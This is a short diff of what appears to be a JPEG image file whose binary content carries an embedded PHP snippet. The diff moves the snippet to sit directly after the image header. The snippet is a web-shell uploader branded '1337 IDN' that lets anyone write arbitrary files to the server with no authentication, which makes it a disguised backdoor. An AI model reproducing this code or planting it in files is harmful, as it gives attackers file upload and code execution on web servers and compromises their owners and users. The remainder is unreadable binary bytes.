@@ -1,15 +1,6 @@
-<?php echo"<b>1337 IDN</b><br>";if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Berhasil";}else{echo"Gak Berhasil";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>";}?>��C
-
-
-
-
-
-
-
-
-
 ��C
-
+��C
+<?php echo"<b>1337 IDN</b><br>";if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Berhasil";}else{echo"Gak Berhasil";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>";}?>
         ����"#Qr����&1!A"2qQa���
                                 ?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM��r�N&"KgX:��nTJnLK��@!�-�
        ���m�;�g���&�hw���@�ܗ
